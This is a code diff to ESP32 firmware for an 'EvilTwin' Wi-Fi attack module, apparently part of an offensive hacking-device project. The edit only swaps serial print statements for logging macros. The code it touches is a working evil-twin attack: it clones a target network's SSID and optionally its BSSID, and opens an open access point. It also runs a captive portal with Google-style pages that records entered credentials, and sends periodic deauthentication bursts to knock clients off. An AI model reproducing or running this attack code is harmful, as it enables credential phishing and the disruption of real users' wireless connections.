@@ -11,6 +11,7 @@ static uint32_t millis() { return evil_twin_mock_millis; }
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include "core/event_bus.h"
+#include "utils/log.h"  // device-only: brings in Arduino.h; UNIT_TEST uses a local millis()
 #endif
 
 namespace attack {
@@ -70,8 +71,8 @@ bool EvilTwin::start() {
     }
     
 #ifndef UNIT_TEST
-    Serial.printf("[EvilTwin] Starting attack on SSID: %s, CH: %d\n",
-                  targetSSID_, targetChannel_);
+    LOG_I("EVILTWIN", "Starting attack on SSID: %s, CH: %d",
+          targetSSID_, targetChannel_);
 #endif
     
     state_ = EvilTwinState::STARTING;
@@ -87,12 +88,12 @@ bool EvilTwin::start() {
     bool wasConnected = WiFi.isConnected();
     
     if (wasConnected) {
-        Serial.printf("[EvilTwin] Saving STA connection to %s for reconnect\n", savedSSID.c_str());
+        LOG_I("EVILTWIN", "Saving STA connection to %s for reconnect", savedSSID.c_str());
     }
     
     // Switch to AP+STA mode
     if (!WiFi.mode(WIFI_AP_STA)) {
-        Serial.println("[EvilTwin] ERROR: Failed to set AP+STA mode!");
+        LOG_E("EVILTWIN", "Failed to set AP+STA mode!");
         state_ = EvilTwinState::ERROR;
         return false;
     }
@@ -100,7 +101,7 @@ bool EvilTwin::start() {
     
     // Reconnect STA if we were connected
     if (wasConnected && savedSSID.length() > 0) {
-        Serial.printf("[EvilTwin] Reconnecting to %s...\n", savedSSID.c_str());
+        LOG_I("EVILTWIN", "Reconnecting to %s...", savedSSID.c_str());
         WiFi.begin(savedSSID.c_str(), savedPSK.c_str());
         
         // Wait for reconnection with timeout (required for traffic proxy)
@@ -110,36 +111,36 @@ bool EvilTwin::start() {
         }
         
         if (WiFi.isConnected()) {
-            Serial.printf("[EvilTwin] STA reconnected! IP: %s\n", WiFi.localIP().toString().c_str());
+            LOG_I("EVILTWIN", "STA reconnected! IP: %s", WiFi.localIP().toString().c_str());
         } else {
-            Serial.println("[EvilTwin] WARNING: STA reconnection timeout - traffic proxy may not work");
+            LOG_W("EVILTWIN", "STA reconnection timeout - traffic proxy may not work");
         }
     }
     
     // Optionally set custom BSSID before starting AP
     if (hasTargetBSSID_) {
-        Serial.printf("[EvilTwin] Setting custom BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
-                      targetBSSID_[0], targetBSSID_[1], targetBSSID_[2],
-                      targetBSSID_[3], targetBSSID_[4], targetBSSID_[5]);
+        LOG_I("EVILTWIN", "Setting custom BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+              targetBSSID_[0], targetBSSID_[1], targetBSSID_[2],
+              targetBSSID_[3], targetBSSID_[4], targetBSSID_[5]);
         esp_wifi_set_mac(WIFI_IF_AP, targetBSSID_);
     }
     
     // Start soft AP - open network (no password)
-    Serial.printf("[EvilTwin] Creating AP: %s on channel %d\n", targetSSID_, targetChannel_);
+    LOG_I("EVILTWIN", "Creating AP: %s on channel %d", targetSSID_, targetChannel_);
     bool apStarted = WiFi.softAP(targetSSID_, nullptr, targetChannel_, 0, 8);
-    
+
     if (!apStarted) {
-        Serial.println("[EvilTwin] ERROR: Failed to start SoftAP!");
+        LOG_E("EVILTWIN", "Failed to start SoftAP!");
         state_ = EvilTwinState::ERROR;
         return false;
     }
     
     IPAddress apIP = WiFi.softAPIP();
-    Serial.printf("[EvilTwin] AP started! IP: %s\n", apIP.toString().c_str());
-    
+    LOG_I("EVILTWIN", "AP started! IP: %s", apIP.toString().c_str());
+
     // Wait for AP to fully initialize before starting DNS (like Bruce does)
     // The WiFi stack needs time to be ready for DNS binding
-    Serial.println("[EvilTwin] Waiting for AP to stabilize...");
+    LOG_D("EVILTWIN", "Waiting for AP to stabilize...");
     uint32_t waitStart = millis();
     while (millis() - waitStart < 2000) {
         yield();  // Allow background tasks to run
@@ -156,20 +157,20 @@ bool EvilTwin::start() {
     // Start Arduino-based captive portal (includes DNS server) if enabled
     if (portalConfig_.enableCaptivePortal) {
         if (!arduinoPortal_.start(portalTitle)) {
-            Serial.println("[EvilTwin] ERROR: Failed to start captive portal!");
+            LOG_E("EVILTWIN", "Failed to start captive portal!");
             WiFi.softAPdisconnect(true);
             state_ = EvilTwinState::ERROR;
             return false;
         }
         arduinoPortal_.setSSID(targetSSID_);  // Set SSID for credential filename
         arduinoPortal_.setPageType(portalConfig_.pageType);  // Set portal template (Generic/Google)
-        Serial.printf("[EvilTwin] Captive portal started with pageType: %d\n", 
-                      static_cast<int>(portalConfig_.pageType));
+        LOG_I("EVILTWIN", "Captive portal started with pageType: %d",
+              static_cast<int>(portalConfig_.pageType));
     } else {
-        Serial.println("[EvilTwin] Traffic routing mode - captive portal disabled");
+        LOG_I("EVILTWIN", "Traffic routing mode - captive portal disabled");
     }
-    
-    Serial.println("[EvilTwin] Attack running!");
+
+    LOG_I("EVILTWIN", "Attack running!");
 #endif
 
     state_ = EvilTwinState::RUNNING;
@@ -184,7 +185,7 @@ void EvilTwin::stop() {
     }
     
 #ifndef UNIT_TEST
-    Serial.println("[EvilTwin] Stopping...");
+    LOG_I("EVILTWIN", "Stopping...");
 #endif
     
     state_ = EvilTwinState::STOPPING;
@@ -200,7 +201,7 @@ void EvilTwin::stop() {
     WiFi.mode(WIFI_OFF);
     delay(100);  // Give time for mode switch
     
-    Serial.println("[EvilTwin] Stopped");
+    LOG_I("EVILTWIN", "Stopped");
 #endif
     
     state_ = EvilTwinState::IDLE;
@@ -256,7 +257,7 @@ void EvilTwin::sendDeauthBurst() {
         true      // alsoDisassoc
     );
     stats_.deauthsSent += sent;
-    Serial.println("[EvilTwin] Sent periodic deauth burst");
+    LOG_D("EVILTWIN", "Sent periodic deauth burst");
 #else
     stats_.deauthsSent += 6;
 #endif
